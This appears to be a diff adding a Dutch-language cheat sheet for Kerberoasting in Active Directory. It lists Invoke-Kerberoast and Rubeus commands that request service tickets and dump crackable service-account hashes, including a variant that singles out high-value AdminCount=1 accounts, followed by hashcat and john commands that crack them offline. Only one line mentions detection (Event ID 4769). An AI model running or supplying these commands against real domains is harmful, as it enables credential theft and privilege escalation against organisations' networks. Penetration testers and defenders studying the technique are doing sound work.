@@ -1,0 +1,48 @@
+# Invoke-Kerberoast — Kerberoasting via PowerShell
+# Vraagt TGS tickets aan voor service accounts en extraheert kraakbare hashes
+#
+# === Syntax ===
+# Invoke-Kerberoast [-Identity user] [-Domain domain] [-OutputFormat Hashcat|JohnTheRipper]
+#
+# === Werking ===
+# Elke domain user kan TGS tickets aanvragen voor accounts met een SPN.
+# De ticket is versleuteld met het wachtwoord van het service account.
+# Hash kan offline gekraakt worden met hashcat/john.
+#
+# === Opties ===
+# -Identity       Specifiek service account targeten
+# -Domain         Domeinnaam
+# -Server         Specifieke DC
+# -OutputFormat    Hashcat (standaard) of JohnTheRipper
+# -AdminCount      Alleen accounts met AdminCount=1 (high-value)
+#
+# === Voorbeelden ===
+
+# Alle kerberoastable accounts — Hashcat formaat
+Invoke-Kerberoast -OutputFormat Hashcat | fl
+
+# Opslaan naar bestand voor offline kraken
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File kerberoast.txt
+
+# Specifiek service account
+Invoke-Kerberoast -Identity svc_sql -OutputFormat Hashcat
+
+# Alleen high-value targets (AdminCount=1)
+Invoke-Kerberoast -AdminCount -OutputFormat Hashcat
+
+# Met specifiek domein en DC
+Invoke-Kerberoast -Domain DOMAIN -Server DC01.DOMAIN -OutputFormat Hashcat
+
+# Rubeus variant (C#)
+Rubeus.exe kerberoast /outfile:kerberoast.txt
+Rubeus.exe kerberoast /user:svc_sql /outfile:kerberoast.txt
+
+# Hashcat kraken (mode 13100 = Kerberoast)
+hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule
+
+# John kraken
+john --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt
+
+# NOTE: Elke domain user kan dit uitvoeren — geen speciale rechten nodig
+# NOTE: Detecteerbaar via Event ID 4769 (TGS requests) met RC4 encryptie
+# NOTE: Succes hangt af van wachtwoordsterkte van service accounts
